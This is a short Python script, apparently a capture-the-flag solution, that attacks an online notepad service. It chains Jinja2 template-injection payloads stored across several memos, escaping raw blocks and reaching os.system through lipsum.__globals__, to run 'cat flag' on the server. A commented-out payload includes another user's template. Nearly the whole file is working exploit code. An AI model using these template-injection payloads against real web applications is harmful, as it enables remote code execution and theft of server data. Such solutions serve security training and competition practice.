import requests, json

host = "onlinenotepad.sstf.site"

def memo_write(host, data):
    headers = {'Content-type': 'application/json', 'Accept': 'text/plain'}
    r = requests.post("http://%s/memo/" % host, data=json.dumps(data), headers=headers)
    return r.status_code == 200

def memo_read(host, userid, password):
    r = requests.get("http://%s/memo/%s/%s" % (host, userid, password))
    return r.text


# Read the admin's memo
#memo_admin = {'userid': 'testa', 'password': 'testa', 'memo': '{%endraw%}{%include"admin.html"%}{%raw%}'}
#print( memo_write(host, memo_admin) )
#print( memo_read(host, "testa", "testa") ) # "Hacked by Super Hacker!"  ... How did hackers change the memo?


# Get shell
memo0 = {'userid': 'testx', 'password': 'testx', 'memo': '-'}
memo1 = {'userid': 'test1', 'password': 'test1', 'memo': '{%endraw%}{%set r=lipsum%}{%include"test2.html"%}1{%raw%}'}
memo2 = {'userid': 'test2', 'password': 'test2', 'memo': '{%endraw%}{%set r=r.__globals__%}{%include"test3.html"%}2{%raw%}'}
memo3 = {'userid': 'test3', 'password': 'test3', 'memo': '{%endraw%}{%set p=r.os.system%}{%include"test4.html"%}3{%raw%}'}
memo4 = {'userid': 'test4', 'password': 'test4', 'memo': '{%endraw%}{%set r=p("cat flag > memo/testx.html")%}4{%raw%}'}

print( memo_write(host, memo0) )
print( memo_write(host, memo1) )
print( memo_write(host, memo2) )
print( memo_write(host, memo3) )
print( memo_write(host, memo4) )

memo_read(host, "test1", "test1")
print( memo_read(host, "testx", "testx") )
